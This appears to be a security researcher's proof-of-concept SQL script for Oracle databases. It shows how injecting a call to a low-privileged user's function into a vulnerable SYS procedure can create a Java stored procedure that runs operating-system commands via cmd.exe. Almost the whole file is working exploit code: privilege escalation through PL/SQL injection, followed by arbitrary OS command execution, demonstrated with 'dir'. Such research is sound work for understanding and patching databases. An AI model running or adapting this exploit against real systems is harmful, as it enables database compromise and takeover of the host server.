/*
  Advanced SQL Injection in Oracle databases
  Executing OS Command with SQL Injection

  By Esteban Martinez Fayo
  secemf@yahoo.com.ar
*/

CREATE OR REPLACE  FUNCTION "SCOTT"."SQLI"  return varchar2
authid current_user as
  pragma autonomous_transaction;
  SqlCommand VARCHAR2(2048);

BEGIN
  SqlCommand := '
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "SRC_EXECUTEOS" AS
import java.lang.*;
import java.io.*;

public class ExecuteOS
{
  public static void printFile (String fileName) throws IOException
  {
    File fileOut;
    FileReader fileReaderOut;
    BufferedReader buffReader;
    String strRead;

    fileOut = new File (fileName);
    fileReaderOut = new FileReader (fileOut);
    buffReader = new BufferedReader(fileReaderOut);
    while ((strRead = buffReader.readLine()) != null)
      System.out.println(strRead);
  }

  public static void execOSCmd (String cmd) throws IOException, java.lang.InterruptedException
  {
    String[] strCmd = {"cmd.exe", "/c", "1>c:\\stdout.txt", "2>c:\\stderr.txt", cmd};

    System.out.println("==========\r\nExecuting OS command...");
    Process p = Runtime.getRuntime().exec(strCmd);
    p.waitFor();
    System.out.println("\r\n==========\r\nThis was the STANDARD OUTPUT for the command:");
    printFile ("c:\\stdout.txt");
    System.out.println("\r\n==========\r\nThis was the ERROR OUTPUT for the command:");
    printFile ("c:\\stderr.txt");
  }
}';
  execute immediate SqlCommand;

  SqlCommand := '
CREATE OR REPLACE PROCEDURE "PROC_EXECUTEOS" (p_command varchar2)
AS LANGUAGE JAVA
NAME ''ExecuteOS.execOSCmd (java.lang.String)'';';
  execute immediate SqlCommand;

  execute immediate 'GRANT EXECUTE ON PROC_EXECUTEOS TO SCOTT';

  commit; -- Must do a commit
  return ''; -- Must return a value
END;
/

-- SYS.SQLIVULN is a procedure vulnerable to SQL Injection. The vulnerability exists
-- in a single PL/SQL statement (not in an anonymous PL/SQL block).
-- See file SQLInjectionLimitation.sql
EXEC SYS.SQLIVULN('MANAGER''||SCOTT.SQLI()||''');
/
SET SERVEROUTPUT ON
/
CALL dbms_java.set_output(1999);
/
EXEC sys.proc_executeos ('dir');
